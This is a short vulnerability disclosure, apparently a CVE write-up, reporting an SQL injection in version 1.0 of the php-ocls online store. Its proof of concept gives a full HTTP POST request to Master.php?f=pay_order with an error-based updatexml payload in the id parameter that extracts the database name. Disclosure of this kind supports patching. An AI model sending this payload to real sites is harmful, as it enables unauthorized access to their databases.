# php-ocls<=v1.0 Authenticated unauthorized SQL injection

## Description

    php-ocls<=v1.0 /php-ocls/classes/Master.php interface has unauthorized SQL injection vulnerability

## source code

    php-ocls<=1.0
    Software Link: https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html

## Author

    yangfan2@webray.com.cn inc  

## Proof of Concept

1. /php-ocls/classes/Master.php?f=pay_order SQL injection exists for parameter id

   ```
   POST /php-ocls/classes/Master.php?f=pay_order HTTP/1.1
   Host: 172.20.10.166:8080
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.9
   x-forwarded-for: 127.0.0.1
   x-originating-ip: 127.0.0.1
   x-remote-ip: 127.0.0.1
   x-remote-addr: 127.0.0.1
   Connection: close
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 55
   
   id=1'and updatexml(1,concat(0x7e,(database()),0x7e),1)#
   ```
   
   | ![image-20240816172147822](https://raw.githubusercontent.com/0xffaaa/cve/main/php-ocls-Arbitrary%20Sqli.assets/image-20240816172147822.png) |
   | ------------------------------------------------------------ |
   
   
